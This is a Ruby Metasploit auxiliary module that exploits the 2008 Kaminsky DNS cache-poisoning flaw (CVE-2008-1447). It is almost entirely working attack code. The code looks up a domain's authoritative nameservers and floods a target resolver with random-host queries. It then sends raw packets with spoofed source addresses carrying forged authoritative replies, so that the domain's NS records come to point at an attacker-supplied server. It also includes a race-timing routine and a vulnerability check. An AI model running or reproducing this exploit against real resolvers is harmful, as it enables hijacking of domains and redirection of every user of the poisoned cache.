require 'msf/core'
require 'net/dns'
require 'racket'
require 'resolv'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Ip

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'DNS BailiWicked Domain Attack',
			'Description'    => %q{
				This exploit attacks a fairly ubiquitous flaw in DNS implementations which 
				Dan Kaminsky found and disclosed ~Jul 2008.  This exploit replaces the target
				domains nameserver entries in a vulnerable DNS cache server. This attack works
				by sending random hostname queries to the target DNS server coupled with spoofed
				replies to those queries from the authoritative nameservers for that domain.
				Eventually, a guessed ID will match, the spoofed packet will get accepted, and
				the nameserver entries for the target domain will be replaced by the server
				specified in the NEWDNS option of this exploit. 
			},
			'Author'         => 
				[ 
				'	I)ruid', 'hdm',
					                                      #
					'Cedric Blancher <sid[at]rstack.org>' # Cedric figured out the NS injection method 
					                                      # and was cool enough to email us and share!
					                                      #
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 6950 $',
			'References'     =>
				[
					[ 'CVE', '2008-1447' ],
					[ 'US-CERT-VU', '800113' ],
					[ 'URL', 'http://www.caughq.org/exploits/CAU-EX-2008-0003.txt' ],
				],
			'DisclosureDate' => 'Jul 21 2008'
			))
			
			register_options(
				[
					OptEnum.new('SRCADDR', [true, 'The source address to use for sending the queries', 'Real', ['Real', 'Random'], 'Real']),
					OptPort.new('SRCPORT', [true, "The target server's source query port (0 for automatic)", nil]),
					OptString.new('DOMAIN', [true, 'The domain to hijack', 'example.com']),
					OptString.new('NEWDNS', [true, 'The hostname of the replacement DNS server', nil]),
					OptAddress.new('RECONS', [true, 'The nameserver used for reconnaissance', '208.67.222.222']),
					OptInt.new('XIDS', [true, 'The number of XIDs to try for each query (0 for automatic)', 0]),
					OptInt.new('TTL', [true, 'The TTL for the malicious host entry', rand(20000)+30000]),
				], self.class)
					
	end
	
	def auxiliary_commands
		return { 
			"check" => "Determine if the specified DNS server (RHOST) is vulnerable",
			"racer" => "Determine the size of the window for the target server"
		 }
	end
	
	def cmd_racer(*args)
		targ = args[0] || rhost()
		dom  = args[1] || "example.com"
		
		if(not (targ and targ.length > 0))
			print_status("usage: racer [dns-server] [domain]")
			return
		end
		
		calculate_race(targ, dom)		
	end
	
	def cmd_check(*args)
		targ = args[0] || rhost()
		if(not (targ and targ.length > 0))
			print_status("usage: check [dns-server]")
			return
		end

		print_status("Using the Metasploit service to verify exploitability...")
		srv_sock = Rex::Socket.create_udp(
			'PeerHost' => targ,
			'PeerPort' => 53
		)		

		random = false
		ports  = {}
		lport  = nil
		reps   = 0
		
		1.upto(30) do |i|
		
			req = Resolv::DNS::Message.new
			txt = "spoofprobe-check-#{i}-#{$$}#{(rand()*1000000).to_i}.red.metasploit.com"
			req.add_question(txt, Resolv::DNS::Resource::IN::TXT)
			req.rd = 1
			
			srv_sock.put(req.encode)
			res, addr = srv_sock.recvfrom(65535, 1.0)


			if res and res.length > 0
				reps += 1
				res = Resolv::DNS::Message.decode(res)
				res.each_answer do |name, ttl, data|
					if (name.to_s == txt and data.strings.join('') =~ /^([^\s]+)\s+.*red\.metasploit\.com/m)
						t_addr, t_port = $1.split(':')

						print_status(" >> ADDRESS: #{t_addr}  PORT: #{t_port}")
						t_port = t_port.to_i
						if(lport and lport != t_port)
							random = true
						end
						lport  = t_port
						ports[t_port] ||=0
						ports[t_port]  +=1
					end
				end
			end
			
	
			if(i>5 and ports.keys.length == 0)
				break
			end	
		end
		
		srv_sock.close
		
		if(ports.keys.length == 0)
			print_status("ERROR: This server is not replying to recursive requests")
			return
		end
		
		if(reps < 30)
			print_status("WARNING: This server did not reply to all of our requests")
		end
		
		if(random)
			ports_u = ports.keys.length
			ports_r = ((ports.keys.length/30.0)*100).to_i
			print_status("PASS: This server does not use a static source port. Randomness: #{ports_u}/30 %#{ports_r}")
			if(ports_r != 100)
				print_status("INFO: This server's source ports are not really random and may still be exploitable, but not by this tool.")
			end
		else
			print_status("FAIL: This server uses a static source port and is vulnerable to poisoning")
		end
	end
			
	def run
		target  = rhost()
		source  = Rex::Socket.source_address(target)
		saddr   = datastore['SRCADDR']
		sport   = datastore['SRCPORT']
		domain  = datastore['DOMAIN'] + '.'
		newdns  = datastore['NEWDNS']
		recons  = datastore['RECONS']
		xids    = datastore['XIDS'].to_i
		newttl  = datastore['TTL'].to_i
		xidbase = rand(20001) + 20000
		numxids = xids		
		address = Rex::Text.rand_text(4).unpack("C4").join(".")

		srv_sock = Rex::Socket.create_udp(
			'PeerHost' => target,
			'PeerPort' => 53
		)

		# Get the source port via the metasploit service if it's not set
		if sport.to_i == 0
			req = Resolv::DNS::Message.new
			txt = "spoofprobe-#{$$}#{(rand()*1000000).to_i}.red.metasploit.com"
			req.add_question(txt, Resolv::DNS::Resource::IN::TXT)
			req.rd = 1
			
			srv_sock.put(req.encode)
			res, addr = srv_sock.recvfrom()
			
			if res and res.length > 0
				res = Resolv::DNS::Message.decode(res)
				res.each_answer do |name, ttl, data|
					if (name.to_s == txt and data.strings.join('') =~ /^([^\s]+)\s+.*red\.metasploit\.com/m)
						t_addr, t_port = $1.split(':')
						sport = t_port.to_i

						print_status("Switching to target port #{sport} based on Metasploit service")
						if target != t_addr
							print_status("Warning: target address #{target} is not the same as the nameserver's query source address #{t_addr}!")
						end
					end
				end
			end
		end

		# Verify its not already poisoned
		begin
			query = Resolv::DNS::Message.new
			query.add_question(domain, Resolv::DNS::Resource::IN::NS)
			query.rd = 0

			begin
				cached = false
				srv_sock.put(query.encode)
				answer, addr = srv_sock.recvfrom()

				if answer and answer.length > 0
					answer = Resolv::DNS::Message.decode(answer)
					answer.each_answer do |name, ttl, data|

						if((name.to_s + ".") == domain and data.name.to_s == newdns)
							t = Time.now + ttl
							print_status("Failure: This domain is already using #{newdns} as a nameserver")
							print_status("         Cache entry expires on #{t}")
							srv_sock.close
							disconnect_ip
							return
						end
					end
					
				end
			end until not cached
		rescue ::Interrupt
			raise $!
		rescue ::Exception => e
			print_status("Error checking the DNS name: #{e.class} #{e} #{e.backtrace}")
		end


		res0 = Net::DNS::Resolver.new(:nameservers => [recons], :dns_search => false, :recursive => true) # reconnaissance resolver

		print_status "Targeting nameserver #{target} for injection of #{domain} nameservers as #{newdns}"

		# Look up the nameservers for the domain
		print_status "Querying recon nameserver for #{domain}'s nameservers..."
		answer0 = res0.send(domain, Net::DNS::NS)
		#print_status " Got answer with #{answer0.header.anCount} answers, #{answer0.header.nsCount} authorities"

		barbs = [] # storage for nameservers
		answer0.answer.each do |rr0|
			print_status " Got an #{rr0.type} record: #{rr0.inspect}"
			if rr0.type == 'NS'
				print_status "  Querying recon nameserver for address of #{rr0.nsdname}..."
				answer1 = res0.send(rr0.nsdname) # get the ns's answer for the hostname
				#print_status " Got answer with #{answer1.header.anCount} answers, #{answer1.header.nsCount} authorities"
				answer1.answer.each do |rr1|
					print_status "   Got an #{rr1.type} record: #{rr1.inspect}"
					res2 = Net::DNS::Resolver.new(:nameservers => rr1.address, :dns_search => false, :recursive => false, :retry => 1) 
					print_status "    Checking Authoritativeness: Querying #{rr1.address} for #{domain}..."
					answer2 = res2.send(domain, Net::DNS::SOA)
					if answer2 and answer2.header.auth? and answer2.header.anCount >= 1
						nsrec = {:name => rr0.nsdname, :addr => rr1.address}
						barbs << nsrec
						print_status "    #{rr0.nsdname} is authoritative for #{domain}, adding to list of nameservers to spoof as"
					end
				end
			end	
		end

		if barbs.length == 0
			print_status( "No DNS servers found.")
			srv_sock.close
			disconnect_ip
			return
		end
		
		if(xids == 0)
			print_status("Calculating the number of spoofed replies to send per query...")
			qcnt = calculate_race(target, domain, 100)
			numxids = ((qcnt * 1.5) / barbs.length).to_i
			if(numxids == 0)
				print_status("The server did not reply, giving up.")
				srv_sock.close
				disconnect_ip
				return
			end			
			print_status("Sending #{numxids} spoofed replies from each nameserver (#{barbs.length}) for each query")
		end
		
		# Flood the target with queries and spoofed responses, one will eventually hit
		queries = 0
		responses = 0

		connect_ip if not ip_sock

		print_status( "Attempting to inject poison records for #{domain}'s nameservers into #{target}:#{sport}...")

		while true
			randhost = Rex::Text.rand_text_alphanumeric(rand(10)+10) + '.' + domain # randomize the hostname

			# Send spoofed query
			req = Resolv::DNS::Message.new
			req.id = rand(2**16)
			req.add_question(randhost, Resolv::DNS::Resource::IN::A)

			req.rd = 1

			src_ip = source
			
			if(saddr == 'Random')
				src_ip = Rex::Text.rand_text(4).unpack("C4").join(".")
			end
			
			n = Racket::Racket.new
			n.l3 = Racket::IPv4.new
			n.l3.src_ip = src_ip
			n.l3.dst_ip = target
			n.l3.protocol = 17
			n.l3.id = rand(0x10000)
			n.l3.ttl = 255
			n.l4 = Racket::UDP.new
			n.l4.src_port = (rand((2**16)-1024)+1024).to_i
			n.l4.dst_port = 53
			n.l4.payload  = req.encode
			n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)	
			buff = n.pack			

			ip_sock.sendto(buff, target)
			queries += 1
			
			# Send evil spoofed answer from ALL nameservers (barbs[*][:addr])
			req.add_answer(randhost, newttl, Resolv::DNS::Resource::IN::A.new(address))
			req.add_authority(domain, newttl, Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create(newdns)))
			req.add_additional(newdns, newttl, Resolv::DNS::Resource::IN::A.new(address)) # Ignored
			req.qr = 1
			req.aa = 1

			# Reuse our Racket object
			n.l4.src_port = 53
			n.l4.dst_port = sport.to_i
			n.l4.payload  = req.encode
						
			xidbase.upto(xidbase+numxids-1) do |id|
				req.id = id
				barbs.each do |barb|	
					n.l3.src_ip = barb[:addr].to_s
					n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)	
					buff = n.pack
						
					ip_sock.sendto(buff, target)
					responses += 1
				end
			end

			# status update
			if queries % 1000 == 0
				print_status("Sent #{queries} queries and #{responses} spoofed responses...")
				if(xids == 0)
					print_status("Recalculating the number of spoofed replies to send per query...")
					qcnt = calculate_race(target, domain, 25)
					numxids = ((qcnt * 1.5) / barbs.length).to_i
					if(numxids == 0)
						print_status("The server has stopped replying, giving up.")
						srv_sock.close
						disconnect_ip
						return
					end
					print_status("Now sending #{numxids} spoofed replies from each nameserver (#{barbs.length}) for each query")
				end	
			end

			# every so often, check and see if the target is poisoned...
			if queries % 250 == 0 
				begin
					query = Resolv::DNS::Message.new
					query.add_question(domain, Resolv::DNS::Resource::IN::NS)
					query.rd = 0
	
					srv_sock.put(query.encode)
					answer, addr = srv_sock.recvfrom()

					if answer and answer.length > 0
						answer = Resolv::DNS::Message.decode(answer)
						answer.each_answer do |name, ttl, data|
							if((name.to_s + ".") == domain and data.name.to_s == newdns)
								print_status("Poisoning successful after #{queries} queries and #{responses} responses: #{domain} == #{newdns}")
								srv_sock.close
								disconnect_ip
								return
							end
						end
					end
				rescue ::Interrupt
					raise $!
				rescue ::Exception => e
					print_status("Error querying the DNS name: #{e.class} #{e} #{e.backtrace}")
				end
			end

		end

	end

	#
	# Send a recursive query to the target server, then flood
	# the server with non-recursive queries for the same entry.
	# Calculate how many non-recursive queries we receive back
	# until the real server responds. This should give us a 
	# ballpark figure for ns->ns latency. We can repeat this 
	# a few times to account for each nameserver the cache server
	# may query for the target domain.
	#
	def calculate_race(server, domain, num=50)

		q_beg_t = nil
		q_end_t = nil
		cnt     = 0

		times   = []
		
		hostname = Rex::Text.rand_text_alphanumeric(rand(10)+10) + '.' + domain
				
		sock = Rex::Socket.create_udp(
			'PeerHost' => server,
			'PeerPort' => 53
		)


		req = Resolv::DNS::Message.new
		req.add_question(hostname, Resolv::DNS::Resource::IN::A)
		req.rd = 1
		req.id = 1

		Thread.critical = true
		q_beg_t = Time.now.to_f
		sock.put(req.encode)
		req.rd = 0
					
		while(times.length < num)
			res, addr = sock.recvfrom(65535, 0.01)

			if res and res.length > 0
				res = Resolv::DNS::Message.decode(res)

				if(res.id == 1)
					times << [Time.now.to_f - q_beg_t, cnt]
					cnt = 0
					
					hostname = Rex::Text.rand_text_alphanumeric(rand(10)+10) + '.' + domain

					Thread.critical = false
					
					sock.close					
					sock = Rex::Socket.create_udp(
						'PeerHost' => server,
						'PeerPort' => 53
					)		
					
					Thread.critical = true
					
					q_beg_t = Time.now.to_f
					req = Resolv::DNS::Message.new
					req.add_question(hostname, Resolv::DNS::Resource::IN::A)
					req.rd = 1
					req.id = 1
					
					sock.put(req.encode)
					req.rd = 0	
				end
				
				cnt += 1
			end
			
			req.id += 1
			
			sock.put(req.encode)		
		end

		Thread.critical = false
		
		min_time = (times.map{|i| i[0]}.min * 100).to_i / 100.0
		max_time = (times.map{|i| i[0]}.max * 100).to_i / 100.0
		sum       = 0
		times.each{|i| sum += i[0]}
		avg_time = (	(sum / times.length) * 100).to_i / 100.0
		
		min_count = times.map{|i| i[1]}.min
		max_count = times.map{|i| i[1]}.max
		sum       = 0
		times.each{|i| sum += i[1]}
		avg_count = sum / times.length
				
		sock.close
		
		print_status("  race calc: #{times.length} queries | min/max/avg time: #{min_time}/#{max_time}/#{avg_time} | min/max/avg replies: #{min_count}/#{max_count}/#{avg_count}")


		# XXX: We should subtract the timing from the target to us (calculated based on 0.50 of our non-recursive query times)
		avg_count
	end	
	
end
